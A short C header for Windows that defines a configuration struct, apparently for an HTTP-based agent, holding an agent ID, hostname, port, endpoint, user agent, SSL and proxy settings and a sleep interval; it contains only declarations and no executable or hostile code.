#include <windows.h>

typedef struct 
{
    PCHAR agentID; //uuid

    PWCHAR hostname;
    DWORD httpPort;
    PWCHAR endPoint;
    PWCHAR userAgent;

    BOOL isSSL;
    BOOL isProxyEnabled;
    PWCHAR proxyURL;

    UINT32 sleeptime;

} CONFIG_CORN, *PCONFIG_CORN;

extern CONFIG_CORN corn_config;

